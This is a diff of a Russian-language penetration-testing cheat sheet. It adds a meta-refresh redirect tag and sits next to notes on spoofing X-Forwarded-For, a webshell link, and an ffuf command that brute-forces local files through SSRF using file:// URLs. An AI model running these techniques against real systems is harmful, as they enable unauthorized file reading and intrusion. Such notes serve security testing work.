@@ -148,10 +148,16 @@ https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
 
 	https://github.com/PortSwigger/param-miner/tree/master
 
- # Смена IP при запрсе 
+# Заголовки и теги
+
+ перенаправления пользователя на другой URL через указанное количество секунд
+	
+ 	<meta http-equiv="refresh" content="0;http://127.0.0.1:8000"> 
+
+# Смена IP при запрсе 
 
  	X-Forwarded-For: 1
-
+ 
 # Брут файловой системы чере ssrf
 
 	ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018
